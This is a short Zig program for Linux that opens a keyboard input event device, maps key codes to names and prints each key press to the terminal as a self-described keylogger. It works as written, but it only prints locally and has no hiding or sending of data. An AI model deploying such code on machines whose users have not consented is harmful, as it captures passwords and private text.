const std = @import("std");
const c = @cImport({
    @cInclude("fcntl.h");
    @cInclude("unistd.h");
});
const input = @cImport({
    @cInclude("linux/input.h");
});

const print = std.debug.print;

const code_to_value_mappings = blk: {
    const ti = @typeInfo(input);
    const prefix = "KEY_";
    const value_index = prefix.len;
    @setEvalBranchQuota(10000);
    switch (ti) {
        .@"struct" => |s| {
            const max_entries = 0x400;
            var arr: [max_entries]?[]const u8 = .{null} ** max_entries;
            for (s.decls) |d| {
                const name = d.name;
                if (!std.mem.startsWith(u8, name, prefix)) continue;

                const value = name[value_index..];

                const raw = @field(input, name);
                const RawT = @TypeOf(raw);

                switch (@typeInfo(RawT)) {
                    .@"int", .@"comptime_int" => {
                        const code: usize = @intCast(raw);
                        arr[code] = value;
                    },
                    else => continue,
                }
            }
            break :blk arr;
        },
        else => unreachable
    }
};

pub fn main(init: std.process.Init) !void {
    // args
    const arena: std.mem.Allocator = init.arena.allocator();
    const args = try init.minimal.args.toSlice(arena);
    if (args.len < 2) {
        @panic("Must provide the event file argument");
    }
    const event_file_path = args[1];
    print("Events path: {s}\n", .{event_file_path});

    // open the key logger file
    const fd = c.open(event_file_path.ptr, 0);
    print("fd: {d}\n", .{fd});

    print("keylogging active...\n", .{});
    var ie = input.input_event{};
    while (true) {
        _ = c.read(fd, &ie, @sizeOf(input.input_event));
        if (ie.type != input.EV_KEY) continue;
        if (ie.value != 1) continue;
        const mapping = code_to_value_mappings[ie.code] orelse @panic("what happened?");
        if (std.mem.eql(u8, mapping, "SPACE")) print(" ", .{})
        else if (std.mem.eql(u8, mapping, "ENTER")) print("\n", .{})
        else print("{s}", .{mapping});
    }
}

